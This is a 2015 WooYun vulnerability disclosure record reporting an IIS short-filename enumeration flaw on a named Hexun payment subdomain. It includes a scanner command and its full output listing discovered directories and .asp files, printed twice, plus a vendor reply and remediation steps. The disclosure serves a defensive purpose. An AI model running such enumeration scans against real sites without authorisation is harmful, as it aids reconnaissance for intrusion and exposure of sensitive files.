{"id": 30746, "wybug_id": "wooyun-2015-0115841", "wybug_title": "和讯网某站短文件名漏洞", "wybug_corp": "和讯网", "wybug_author": "0c0c0f", "wybug_date": "2015-05-25 16:41", "wybug_open_date": "2015-07-09 16:44", "wybug_type": "系统/服务补丁不及时", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向公众公开  简要描述： 这个漏洞的意义何在：猜解后台地址猜解敏感文件，例如备份的rar、zip、.bak、.SQL文件等。在某些情形下，甚至可以通过短文件名web直接下载对应的文件。比如下载备份SQL文件。 详细说明：  以下域名存在iis短文件名漏洞http://mpay.hexun.com/证明如下:[root@pentest IIS_shortname_Scanner]# python iis_shortname_Scan.py http://mpay.hexun.com/server is vulerable, please wait, scanning...Found /i****\t[scan in progress]Found /a****\t[scan in progress]Found /c****\t[scan in progress]Found /e****\t[scan in progress]Found /m****\t[scan in progress]Found /k****\t[scan in progress]Found /p****\t[scan in progress]Found /n****\t[scan in progress]Found /r****\t[scan in progress]Found /s****\t[scan in progress]Found /t****\t[scan in progress]Found /u****\t[scan in progress]Found /w****\t[scan in progress]Found /z****\t[scan in progress]Found /in****\t[scan in progress]Found /as****\t[scan in progress]Found /ce****\t[scan in progress]Found /ex****\t[scan in progress]Found /me****\t[scan in progress]Found /mo****\t[scan in progress]Found /kq****\t[scan in progress]Found /pa****\t[scan in progress]Found /po****\t[scan in progress]Found /pr****\t[scan in progress]Found /no****\t[scan in progress]Found /re****\t[scan in progress]Found /sh****\t[scan in progress]Found /st****\t[scan in progress]Found /su****\t[scan in progress]Found /sz****\t[scan in progress]Found /te****\t[scan in progress]Found /um****\t[scan in progress]Found /we****\t[scan in progress]Found /zf****\t[scan in progress]Found /inq****\t[scan in progress]Found /int****\t[scan in progress]Found /asp****\t[scan in progress]Found /cer****\t[scan in progress]Found /exc****\t[scan in progress]Found /mes****\t[scan in progress]Found /mer****\t[scan in progress]Found /mon****\t[scan in progress]Found /kqt****\t[scan in progress]Found /pay****\t[scan in progress]Found /pos****\t[scan in progress]Found /pre****\t[scan in progress]Found /not****\t[scan in progress]Found /rem****\t[scan in progress]Found /she****\t[scan in progress]Found /sta****\t[scan in progress]Found /suc****\t[scan in progress]Found /szf****\t[scan in progress]Found /tes****\t[scan in progress]Found /ump****\t[scan in progress]Found /web****\t[scan in progress]Found /zfb****\t[scan in progress]Found /inqu****\t[scan in progress]Found /inte****\t[scan in progress]Found /aspn****\t[scan in progress]Found /cert****\t[scan in progress]Found /exce****\t[scan in progress]Found /mess****\t[scan in progress]Found /merc****\t[scan in progress]Found /mone****\t[scan in progress]Found /kqto****\t[scan in progress]Found /payt****\t[scan in progress]Found /post****\t[scan in progress]Found /prec****\t[scan in progress]Found /noti****\t[scan in progress]Found /remi****\t[scan in progress]Found /shen****\t[scan in progress]Found /star****\t[scan in progress]Found /succ****\t[scan in progress]Found /szft****\t[scan in progress]Found /szf_****\t[scan in progress]Found /test****\t[scan in progress]Found /umpa****\t[scan in progress]Found /zfbt****\t[scan in progress]Found /inqui****\t[scan in progress]Found /inter****\t[scan in progress]Found /aspne****\t[scan in progress]Found /certi****\t[scan in progress]Found /excel****\t[scan in progress]Found /messa****\t[scan in progress]Found /merch****\t[scan in progress]Found /money****\t[scan in progress]Found /kqtoh****\t[scan in progress]Found /payto****\t[scan in progress]Found /post_****\t[scan in progress]Found /preco****\t[scan in progress]Found /notif****\t[scan in progress]Found /remit****\t[scan in progress]Found /shenz****\t[scan in progress]Found /start****\t[scan in progress]Found /succe****\t[scan in progress]Found /szfto****\t[scan in progress]Found /szf_s****\t[scan in progress]Found /test2****\t[scan in progress]Found /umpay****\t[scan in progress]Found /zfbto****\t[scan in progress]Found /inquir****\t[scan in progress]Found /interf****\t[scan in progress]Found /aspnet****\t[scan in progress]Found /certif****\t[scan in progress]Found /excelf****\t[scan in progress]Found /messag****\t[scan in progress]Found /merchb****\t[scan in progress]Found /moneyo****\t[scan in progress]Found /kqtohx****\t[scan in progress]Found /post_r****\t[scan in progress]Found /precom****\t[scan in progress]Found /notify****\t[scan in progress]Found /remiti****\t[scan in progress]Found /shenzh****\t[scan in progress]Found /startp****\t[scan in progress]Found /succes****\t[scan in progress]Found /szftoh****\t[scan in progress]Found /szf_su****\t[scan in progress]Found /umpay_****\t[scan in progress]Found /zfbtoh****\t[scan in progress]Found /inquir*a**\t[scan in progress]Found /inquir*p**\t[scan in progress]Found /inquir*s**\t[scan in progress]Found /interf\t[scan in progress]Found Dir /interf~1\t[Done]Found /aspnet\t[scan in progress]Found Dir /aspnet~1\t[Done]Found /certif\t[scan in progress]Found Dir /certif~1\t[Done]Found /excelf\t[scan in progress]Found Dir /excelf~1\t[Done]Found /messag*h**\t[scan in progress]Found /messag*m**\t[scan in progress]Found /messag*t**\t[scan in progress]Found /merchb\t[scan in progress]Found Dir /merchb~1\t[Done]Found /moneyo\t[scan in progress]Found Dir /moneyo~1\t[Done]Found /kqtohx*a**\t[scan in progress]Found /kqtohx*p**\t[scan in progress]Found /kqtohx*s**\t[scan in progress]Found /post_r*a**\t[scan in progress]Found /post_r*p**\t[scan in progress]Found /post_r*s**\t[scan in progress]Found /precom*c**\t[scan in progress]Found /precom*n**\t[scan in progress]Found /precom*o**\t[scan in progress]Found /notify*a**\t[scan in progress]Found /notify*p**\t[scan in progress]Found /notify*s**\t[scan in progress]Found /remiti*a**\t[scan in progress]Found /remiti*p**\t[scan in progress]Found /remiti*s**\t[scan in progress]Found /startp*a**\t[scan in progress]Found /shenzh\t[scan in progress]Found Dir /shenzh~1\t[Done]Found /startp*s**\t[scan in progress]Found /startp*p**\t[scan in progress]Found /succes*a**\t[scan in progress]Found /succes*h**\t[scan in progress]Found /succes*m**\t[scan in progress]Found /succes*p**\t[scan in progress]Found /succes*t**\t[scan in progress]Found /succes*s**\t[scan in progress]Found /szftoh*a**\t[scan in progress]Found /szftoh*p**\t[scan in progress]Found /szftoh*s**\t[scan in progress]Found /szf_su*a**\t[scan in progress]Found /szf_su*p**\t[scan in progress]Found /szf_su*s**\t[scan in progress]Found /umpay_*a**\t[scan in progress]Found /umpay_*p**\t[scan in progress]Found /umpay_*s**\t[scan in progress]Found /zfbtoh*a**\t[scan in progress]Found /zfbtoh*p**\t[scan in progress]Found /zfbtoh*s**\t[scan in progress]Found /inquir*as*\t[scan in progress]Found /inquir*sp*\t[scan in progress]Found /messag*ht*\t[scan in progress]Found /messag*tm*\t[scan in progress]Found /kqtohx*as*\t[scan in progress]Found /kqtohx*sp*\t[scan in progress]Found /post_r*as*\t[scan in progress]Found /post_r*sp*\t[scan in progress]Found /precom*co*\t[scan in progress]Found /precom*on*\t[scan in progress]Found /notify*as*\t[scan in progress]Found /notify*sp*\t[scan in progress]Found /remiti*as*\t[scan in progress]Found /remiti*sp*\t[scan in progress]Found /startp*as*\t[scan in progress]Found /startp*sp*\t[scan in progress]Found /succes*as*\t[scan in progress]Found /succes*ht*\t[scan in progress]Found /succes*tm*\t[scan in progress]Found /succes*sp*\t[scan in progress]Found /szftoh*as*\t[scan in progress]Found /szftoh*sp*\t[scan in progress]Found /szf_su*as*\t[scan in progress]Found /szf_su*sp*\t[scan in progress]Found /umpay_*as*\t[scan in progress]Found /umpay_*sp*\t[scan in progress]Found /zfbtoh*as*\t[scan in progress]Found /zfbtoh*sp*\t[scan in progress]Found /inquir*asp\t[scan in progress]Found File /inquir~1.asp\t[Done]Found /messag*htm\t[scan in progress]Found File /messag~1.htm\t[Done]Found /kqtohx*asp\t[scan in progress]Found File /kqtohx~1.asp\t[Done]Found /post_r*asp\t[scan in progress]Found File /post_r~1.asp\t[Done]Found /precom*con\t[scan in progress]Found File /precom~1.con\t[Done]Found /notify*asp\t[scan in progress]Found File /notify~1.asp\t[Done]Found /remiti*asp\t[scan in progress]Found File /remiti~1.asp\t[Done]Found /startp*asp\t[scan in progress]Found File /startp~1.asp\t[Done]Found /succes*asp\t[scan in progress]Found File /succes~1.asp\t[Done]Found /succes*htm\t[scan in progress]Found File /succes~1.htm\t[Done]Found /szftoh*asp\t[scan in progress]Found File /szftoh~1.asp\t[Done]Found /szf_su*asp\t[scan in progress]Found File /szf_su~1.asp\t[Done]Found /umpay_*asp\t[scan in progress]Found File /umpay_~1.asp\t[Done]Found /zfbtoh*asp\t[scan in progress]Found File /zfbtoh~1.asp\t[Done]----------------------------------------------------------------Dir:  /interf~1Dir:  /aspnet~1Dir:  /certif~1Dir:  /excelf~1Dir:  /merchb~1Dir:  /moneyo~1Dir:  /shenzh~1File: /inquir~1.aspFile: /messag~1.htmFile: /kqtohx~1.aspFile: /post_r~1.aspFile: /precom~1.conFile: /notify~1.aspFile: /remiti~1.aspFile: /startp~1.aspFile: /succes~1.aspFile: /succes~1.htmFile: /szftoh~1.aspFile: /szf_su~1.aspFile: /umpay_~1.aspFile: /zfbtoh~1.asp----------------------------------------------------------------7 Directories, 14 Files found in toal   漏洞证明：  证明如下:[root@pentest IIS_shortname_Scanner]# python iis_shortname_Scan.py http://mpay.hexun.com/server is vulerable, please wait, scanning...Found /i****\t[scan in progress]Found /a****\t[scan in progress]Found /c****\t[scan in progress]Found /e****\t[scan in progress]Found /m****\t[scan in progress]Found /k****\t[scan in progress]Found /p****\t[scan in progress]Found /n****\t[scan in progress]Found /r****\t[scan in progress]Found /s****\t[scan in progress]Found /t****\t[scan in progress]Found /u****\t[scan in progress]Found /w****\t[scan in progress]Found /z****\t[scan in progress]Found /in****\t[scan in progress]Found /as****\t[scan in progress]Found /ce****\t[scan in progress]Found /ex****\t[scan in progress]Found /me****\t[scan in progress]Found /mo****\t[scan in progress]Found /kq****\t[scan in progress]Found /pa****\t[scan in progress]Found /po****\t[scan in progress]Found /pr****\t[scan in progress]Found /no****\t[scan in progress]Found /re****\t[scan in progress]Found /sh****\t[scan in progress]Found /st****\t[scan in progress]Found /su****\t[scan in progress]Found /sz****\t[scan in progress]Found /te****\t[scan in progress]Found /um****\t[scan in progress]Found /we****\t[scan in progress]Found /zf****\t[scan in progress]Found /inq****\t[scan in progress]Found /int****\t[scan in progress]Found /asp****\t[scan in progress]Found /cer****\t[scan in progress]Found /exc****\t[scan in progress]Found /mes****\t[scan in progress]Found /mer****\t[scan in progress]Found /mon****\t[scan in progress]Found /kqt****\t[scan in progress]Found /pay****\t[scan in progress]Found /pos****\t[scan in progress]Found /pre****\t[scan in progress]Found /not****\t[scan in progress]Found /rem****\t[scan in progress]Found /she****\t[scan in progress]Found /sta****\t[scan in progress]Found /suc****\t[scan in progress]Found /szf****\t[scan in progress]Found /tes****\t[scan in progress]Found /ump****\t[scan in progress]Found /web****\t[scan in progress]Found /zfb****\t[scan in progress]Found /inqu****\t[scan in progress]Found /inte****\t[scan in progress]Found /aspn****\t[scan in progress]Found /cert****\t[scan in progress]Found /exce****\t[scan in progress]Found /mess****\t[scan in progress]Found /merc****\t[scan in progress]Found /mone****\t[scan in progress]Found /kqto****\t[scan in progress]Found /payt****\t[scan in progress]Found /post****\t[scan in progress]Found /prec****\t[scan in progress]Found /noti****\t[scan in progress]Found /remi****\t[scan in progress]Found /shen****\t[scan in progress]Found /star****\t[scan in progress]Found /succ****\t[scan in progress]Found /szft****\t[scan in progress]Found /szf_****\t[scan in progress]Found /test****\t[scan in progress]Found /umpa****\t[scan in progress]Found /zfbt****\t[scan in progress]Found /inqui****\t[scan in progress]Found /inter****\t[scan in progress]Found /aspne****\t[scan in progress]Found /certi****\t[scan in progress]Found /excel****\t[scan in progress]Found /messa****\t[scan in progress]Found /merch****\t[scan in progress]Found /money****\t[scan in progress]Found /kqtoh****\t[scan in progress]Found /payto****\t[scan in progress]Found /post_****\t[scan in progress]Found /preco****\t[scan in progress]Found /notif****\t[scan in progress]Found /remit****\t[scan in progress]Found /shenz****\t[scan in progress]Found /start****\t[scan in progress]Found /succe****\t[scan in progress]Found /szfto****\t[scan in progress]Found /szf_s****\t[scan in progress]Found /test2****\t[scan in progress]Found /umpay****\t[scan in progress]Found /zfbto****\t[scan in progress]Found /inquir****\t[scan in progress]Found /interf****\t[scan in progress]Found /aspnet****\t[scan in progress]Found /certif****\t[scan in progress]Found /excelf****\t[scan in progress]Found /messag****\t[scan in progress]Found /merchb****\t[scan in progress]Found /moneyo****\t[scan in progress]Found /kqtohx****\t[scan in progress]Found /post_r****\t[scan in progress]Found /precom****\t[scan in progress]Found /notify****\t[scan in progress]Found /remiti****\t[scan in progress]Found /shenzh****\t[scan in progress]Found /startp****\t[scan in progress]Found /succes****\t[scan in progress]Found /szftoh****\t[scan in progress]Found /szf_su****\t[scan in progress]Found /umpay_****\t[scan in progress]Found /zfbtoh****\t[scan in progress]Found /inquir*a**\t[scan in progress]Found /inquir*p**\t[scan in progress]Found /inquir*s**\t[scan in progress]Found /interf\t[scan in progress]Found Dir /interf~1\t[Done]Found /aspnet\t[scan in progress]Found Dir /aspnet~1\t[Done]Found /certif\t[scan in progress]Found Dir /certif~1\t[Done]Found /excelf\t[scan in progress]Found Dir /excelf~1\t[Done]Found /messag*h**\t[scan in progress]Found /messag*m**\t[scan in progress]Found /messag*t**\t[scan in progress]Found /merchb\t[scan in progress]Found Dir /merchb~1\t[Done]Found /moneyo\t[scan in progress]Found Dir /moneyo~1\t[Done]Found /kqtohx*a**\t[scan in progress]Found /kqtohx*p**\t[scan in progress]Found /kqtohx*s**\t[scan in progress]Found /post_r*a**\t[scan in progress]Found /post_r*p**\t[scan in progress]Found /post_r*s**\t[scan in progress]Found /precom*c**\t[scan in progress]Found /precom*n**\t[scan in progress]Found /precom*o**\t[scan in progress]Found /notify*a**\t[scan in progress]Found /notify*p**\t[scan in progress]Found /notify*s**\t[scan in progress]Found /remiti*a**\t[scan in progress]Found /remiti*p**\t[scan in progress]Found /remiti*s**\t[scan in progress]Found /startp*a**\t[scan in progress]Found /shenzh\t[scan in progress]Found Dir /shenzh~1\t[Done]Found /startp*s**\t[scan in progress]Found /startp*p**\t[scan in progress]Found /succes*a**\t[scan in progress]Found /succes*h**\t[scan in progress]Found /succes*m**\t[scan in progress]Found /succes*p**\t[scan in progress]Found /succes*t**\t[scan in progress]Found /succes*s**\t[scan in progress]Found /szftoh*a**\t[scan in progress]Found /szftoh*p**\t[scan in progress]Found /szftoh*s**\t[scan in progress]Found /szf_su*a**\t[scan in progress]Found /szf_su*p**\t[scan in progress]Found /szf_su*s**\t[scan in progress]Found /umpay_*a**\t[scan in progress]Found /umpay_*p**\t[scan in progress]Found /umpay_*s**\t[scan in progress]Found /zfbtoh*a**\t[scan in progress]Found /zfbtoh*p**\t[scan in progress]Found /zfbtoh*s**\t[scan in progress]Found /inquir*as*\t[scan in progress]Found /inquir*sp*\t[scan in progress]Found /messag*ht*\t[scan in progress]Found /messag*tm*\t[scan in progress]Found /kqtohx*as*\t[scan in progress]Found /kqtohx*sp*\t[scan in progress]Found /post_r*as*\t[scan in progress]Found /post_r*sp*\t[scan in progress]Found /precom*co*\t[scan in progress]Found /precom*on*\t[scan in progress]Found /notify*as*\t[scan in progress]Found /notify*sp*\t[scan in progress]Found /remiti*as*\t[scan in progress]Found /remiti*sp*\t[scan in progress]Found /startp*as*\t[scan in progress]Found /startp*sp*\t[scan in progress]Found /succes*as*\t[scan in progress]Found /succes*ht*\t[scan in progress]Found /succes*tm*\t[scan in progress]Found /succes*sp*\t[scan in progress]Found /szftoh*as*\t[scan in progress]Found /szftoh*sp*\t[scan in progress]Found /szf_su*as*\t[scan in progress]Found /szf_su*sp*\t[scan in progress]Found /umpay_*as*\t[scan in progress]Found /umpay_*sp*\t[scan in progress]Found /zfbtoh*as*\t[scan in progress]Found /zfbtoh*sp*\t[scan in progress]Found /inquir*asp\t[scan in progress]Found File /inquir~1.asp\t[Done]Found /messag*htm\t[scan in progress]Found File /messag~1.htm\t[Done]Found /kqtohx*asp\t[scan in progress]Found File /kqtohx~1.asp\t[Done]Found /post_r*asp\t[scan in progress]Found File /post_r~1.asp\t[Done]Found /precom*con\t[scan in progress]Found File /precom~1.con\t[Done]Found /notify*asp\t[scan in progress]Found File /notify~1.asp\t[Done]Found /remiti*asp\t[scan in progress]Found File /remiti~1.asp\t[Done]Found /startp*asp\t[scan in progress]Found File /startp~1.asp\t[Done]Found /succes*asp\t[scan in progress]Found File /succes~1.asp\t[Done]Found /succes*htm\t[scan in progress]Found File /succes~1.htm\t[Done]Found /szftoh*asp\t[scan in progress]Found File /szftoh~1.asp\t[Done]Found /szf_su*asp\t[scan in progress]Found File /szf_su~1.asp\t[Done]Found /umpay_*asp\t[scan in progress]Found File /umpay_~1.asp\t[Done]Found /zfbtoh*asp\t[scan in progress]Found File /zfbtoh~1.asp\t[Done]----------------------------------------------------------------Dir:  /interf~1Dir:  /aspnet~1Dir:  /certif~1Dir:  /excelf~1Dir:  /merchb~1Dir:  /moneyo~1Dir:  /shenzh~1File: /inquir~1.aspFile: /messag~1.htmFile: /kqtohx~1.aspFile: /post_r~1.aspFile: /precom~1.conFile: /notify~1.aspFile: /remiti~1.aspFile: /startp~1.aspFile: /succes~1.aspFile: /succes~1.htmFile: /szftoh~1.aspFile: /szf_su~1.aspFile: /umpay_~1.aspFile: /zfbtoh~1.asp----------------------------------------------------------------7 Directories, 14 Files found in toal   修复方案：  1) 升级.net framework2) 修改注册表键值：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem修改NtfsDisable8dot3NameCreation为1。    版权声明：转载请注明来源 0c0c0f@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-25 16:42 厂商回复： 处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}